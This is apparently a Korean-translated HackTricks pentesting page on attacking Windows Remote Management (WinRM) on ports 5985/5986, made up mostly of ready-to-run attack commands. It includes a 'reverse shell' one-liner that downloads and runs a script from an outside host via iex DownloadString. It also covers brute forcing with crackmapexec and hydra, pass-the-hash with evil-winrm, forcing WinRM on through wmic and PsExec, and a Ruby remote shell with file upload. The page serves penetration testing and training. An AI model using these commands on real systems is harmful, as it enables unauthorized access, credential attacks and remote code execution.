# 5985,5986 - Pentesting WinRM

{{#include ../banners/hacktricks-training.md}}

## WinRM

[Windows Remote Management (WinRM)](<https://msdn.microsoft.com/en-us/library/windows/desktop/aa384426(v=vs.85).aspx>)는 **Microsoft**에서 강조하는 **Windows 시스템의 원격 관리**를 HTTP(S)를 통해 가능하게 하는 **프로토콜**입니다. 이 과정에서 SOAP를 활용합니다. 본질적으로 WMI에 의해 구동되며, WMI 작업을 위한 HTTP 기반 인터페이스로 나타납니다.

머신에 WinRM이 존재하면 PowerShell을 통해 간단한 원격 관리가 가능하며, 이는 다른 운영 체제의 SSH와 유사합니다. WinRM이 작동 중인지 확인하려면 특정 포트의 개방 여부를 확인하는 것이 좋습니다:

- **5985/tcp (HTTP)**
- **5986/tcp (HTTPS)**

위 목록에서 열린 포트는 WinRM이 설정되었음을 나타내며, 원격 세션을 시작할 수 있는 시도를 허용합니다.

### **WinRM 세션 시작하기**

PowerShell을 WinRM에 맞게 구성하기 위해 Microsoft의 `Enable-PSRemoting` cmdlet이 사용되며, 이는 컴퓨터가 원격 PowerShell 명령을 수락하도록 설정합니다. 권한이 상승된 PowerShell 접근을 통해 다음 명령을 실행하여 이 기능을 활성화하고 모든 호스트를 신뢰할 수 있는 것으로 지정할 수 있습니다:
```powershell
Enable-PSRemoting -Force
Set-Item wsman:\localhost\client\trustedhosts *
```
이 접근 방식은 `trustedhosts` 구성에 와일드카드를 추가하는 것을 포함하며, 이는 그 함의로 인해 신중한 고려가 필요한 단계입니다. 또한 공격자의 머신에서 네트워크 유형을 "Public"에서 "Work"로 변경해야 할 수도 있음을 언급합니다.

게다가, WinRM은 `wmic` 명령을 사용하여 **원격으로 활성화**할 수 있으며, 다음과 같이 시연됩니다:
```powershell
wmic /node:<REMOTE_HOST> process call create "powershell enable-psremoting -force"
```
이 방법은 원격으로 WinRM을 설정할 수 있게 하여, 원거리에서 Windows 머신을 관리하는 유연성을 향상시킵니다.

### 구성 확인

공격 머신의 설정을 확인하기 위해 `Test-WSMan` 명령을 사용하여 대상이 WinRM이 제대로 구성되었는지 확인합니다. 이 명령을 실행하면 프로토콜 버전 및 wsmid에 대한 세부정보를 수신하게 되며, 이는 성공적인 구성을 나타냅니다. 아래는 구성된 대상과 구성되지 않은 대상의 예상 출력 예시입니다:

- **정상적으로** 구성된 대상의 경우, 출력은 다음과 유사하게 나타납니다:
```bash
Test-WSMan <target-ip>
```
응답에는 프로토콜 버전 및 wsmid에 대한 정보가 포함되어 있으며, 이는 WinRM이 올바르게 설정되었음을 나타냅니다.

![](<../images/image (582).png>)

- 반대로, WinRM에 대해 **구성되지 않은** 대상을 위해서는 그러한 세부 정보가 없으며, 이는 적절한 WinRM 설정이 없음을 강조합니다.

![](<../images/image (458).png>)

### 명령 실행

대상 머신에서 `ipconfig`를 원격으로 실행하고 그 출력을 보려면 다음을 수행하십시오:
```powershell
Invoke-Command -computername computer-name.domain.tld -ScriptBlock {ipconfig /all} [-credential DOMAIN\username]
```
![](<../images/image (151).png>)

현재 PS 콘솔의 **명령을 실행할 수 있습니다** _**Invoke-Command**_를 통해. 로컬에 _**enumeration**_이라는 함수가 있고 이를 **원격 컴퓨터에서 실행하고 싶다면**, 다음과 같이 할 수 있습니다:
```powershell
Invoke-Command -ComputerName <computername> -ScriptBLock ${function:enumeration} [-ArgumentList "arguments"]
```
### 스크립트 실행
```powershell
Invoke-Command -ComputerName <computername> -FilePath C:\path\to\script\file [-credential CSCOU\jarrieta]
```
### 리버스 셸 얻기
```powershell
Invoke-Command -ComputerName <computername> -ScriptBlock {cmd /c "powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10:8080/ipst.ps1')"}
```
### PS 세션 가져오기

대화형 PowerShell 셸을 얻으려면 `Enter-PSSession`을 사용하세요:
```powershell
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

# Enter
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local [-Credential username]
## Bypass proxy
Enter-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
# Save session in var
$sess = New-PSSession -ComputerName 1.1.1.1 -Credential $creds -SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)
Enter-PSSession $sess
## Background current PS session
Exit-PSSession # This will leave it in background if it's inside an env var (New-PSSession...)
```
![](<../images/image (1009).png>)

**세션은 "희생자" 내부의 새로운 프로세스(wsmprovhost)에서 실행됩니다.**

### **WinRM 강제 열기**

PS Remoting과 WinRM을 사용하려고 하지만 컴퓨터가 구성되지 않은 경우, 다음을 통해 활성화할 수 있습니다:
```powershell
.\PsExec.exe \\computername -u domain\username -p password -h -d powershell.exe "enable-psremoting -force"
```
### 세션 저장 및 복원

이 **작동하지 않습니다** 만약 **언어**가 원격 컴퓨터에서 **제한**되어 있다면.
```powershell
#If you need to use different creds
$password=ConvertTo-SecureString 'Stud41Password@123' -Asplaintext -force
## Note the ".\" in the suername to indicate it's a local user (host domain)
$creds2=New-Object System.Management.Automation.PSCredential(".\student41", $password)

#You can save a session inside a variable
$sess1 = New-PSSession -ComputerName <computername> [-SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)]
#And restore it at any moment doing
Enter-PSSession -Session $sess1
```
이 세션 내에서 _Invoke-Command_를 사용하여 PS 스크립트를 로드할 수 있습니다.
```powershell
Invoke-Command -FilePath C:\Path\to\script.ps1 -Session $sess1
```
### 오류

다음 오류가 발생하면:

`enter-pssession : 원격 서버 10.10.10.175에 연결하는 데 실패했습니다. 다음 오류 메시지가 표시됩니다: WinRM 클라이언트가 요청을 처리할 수 없습니다. 인증 방식이 Kerberos와 다르거나 클라이언트 컴퓨터가 도메인에 가입되지 않은 경우 HTTPS 전송을 사용해야 하거나 대상 컴퓨터를 TrustedHosts 구성 설정에 추가해야 합니다. TrustedHosts를 구성하려면 winrm.cmd를 사용하십시오. TrustedHosts 목록에 있는 컴퓨터는 인증되지 않을 수 있습니다. 다음 명령을 실행하여 이에 대한 자세한 정보를 얻을 수 있습니다: winrm help config. 자세한 내용은 about_Remote_Troubleshooting 도움말 주제를 참조하십시오.`

클라이언트에서 시도하십시오 (정보는 [여기](https://serverfault.com/questions/657918/remote-ps-session-fails-on-non-domain-server)에서 확인하십시오):
```ruby
winrm quickconfig
winrm set winrm/config/client '@{TrustedHosts="Computer1,Computer2"}'
```
## WinRM 연결 in linux

### Brute Force

주의하세요, winrm의 brute-forcing은 사용자를 차단할 수 있습니다.
```ruby
#Brute force
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt

#Just check a pair of credentials
# Username + Password + CMD command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -p <password> -x "whoami"
# Username + Hash + PS command execution
crackmapexec winrm <IP> -d <Domain Name> -u <username> -H <HASH> -X '$PSVersionTable'
#Crackmapexec won't give you an interactive shell, but it will check if the creds are valid to access winrm
```
### evil-winrm 사용하기
```ruby
gem install evil-winrm
```
**문서**를 GitHub에서 읽어보세요: [https://github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
```ruby
evil-winrm -u Administrator -p 'EverybodyWantsToWorkAtP.O.O.'  -i <IP>/<Domain>
```
**evil-winrm**를 사용하여 **IPv6 주소**에 연결하려면 _**/etc/hosts**_ 파일에 **도메인 이름**을 IPv6 주소로 설정하여 항목을 생성하고 해당 도메인에 연결합니다.

### evil-winrm으로 해시 전달하기
```ruby
evil-winrm -u <username> -H <Hash> -i <IP>
```
![](<../images/image (680).png>)

### PS-docker 머신 사용하기
```
docker run -it quickbreach/powershell-ntlm
$creds = Get-Credential
Enter-PSSession -ComputerName 10.10.10.149 -Authentication Negotiate -Credential $creds
```
### 루비 스크립트 사용

**여기에서 추출한 코드:** [**https://alamot.github.io/winrm_shell/**](https://alamot.github.io/winrm_shell/)
```ruby
require 'winrm-fs'

# Author: Alamot
# To upload a file type: UPLOAD local_path remote_path
# e.g.: PS> UPLOAD myfile.txt C:\temp\myfile.txt
# https://alamot.github.io/winrm_shell/


conn = WinRM::Connection.new(
endpoint: 'https://IP:PORT/wsman',
transport: :ssl,
user: 'username',
password: 'password',
:no_ssl_peer_verification => true
)


class String
def tokenize
self.
split(/\s(?=(?:[^'"]|'[^']*'|"[^"]*")*$)/).
select {|s| not s.empty? }.
map {|s| s.gsub(/(^ +)|( +$)|(^["']+)|(["']+$)/,'')}
end
end


command=""
file_manager = WinRM::FS::FileManager.new(conn)


conn.shell(:powershell) do |shell|
until command == "exit\n" do
output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
print(output.output.chomp)
command = gets
if command.start_with?('UPLOAD') then
upload_command = command.tokenize
print("Uploading " + upload_command[1] + " to " + upload_command[2])
file_manager.upload(upload_command[1], upload_command[2]) do |bytes_copied, total_bytes, local_path, remote_path|
puts("#{bytes_copied} bytes of #{total_bytes} bytes copied")
end
command = "echo `nOK`n"
end
output = shell.run(command) do |stdout, stderr|
STDOUT.print(stdout)
STDERR.print(stderr)
end
end
puts("Exiting with code #{output.exitcode}")
end
```
## Shodan

- `port:5985 Microsoft-HTTPAPI`

## References

- [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)

## HackTricks 자동 명령
```
Protocol_Name: WinRM    #Protocol Abbreviation if there is one.
Port_Number:  5985     #Comma separated if there is more than one.
Protocol_Description: Windows Remote Managment        #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for WinRM
Note: |
Windows Remote Management (WinRM) is a Microsoft protocol that allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilising WMI, so you can think of it as an HTTP based API for WMI.

sudo gem install winrm winrm-fs colorize stringio
git clone https://github.com/Hackplayers/evil-winrm.git
cd evil-winrm
ruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p ‘MySuperSecr3tPass123!’

https://kalilinuxtutorials.com/evil-winrm-hacking-pentesting/

ruby evil-winrm.rb -i 10.10.10.169 -u melanie -p 'Welcome123!' -e /root/Desktop/Machines/HTB/Resolute/
^^so you can upload binary's from that directory        or -s to upload scripts (sherlock)
menu
invoke-binary `tab`

#python3
import winrm
s = winrm.Session('windows-host.example.com', auth=('john.smith', 'secret'))
print(s.run_cmd('ipconfig'))
print(s.run_ps('ipconfig'))

https://book.hacktricks.wiki/en/network-services-pentesting/5985-5986-pentesting-winrm.html

Entry_2:
Name: Hydra Brute Force
Description: Need User
Command: hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} rdp://{IP}
```
{{#include ../banners/hacktricks-training.md}}
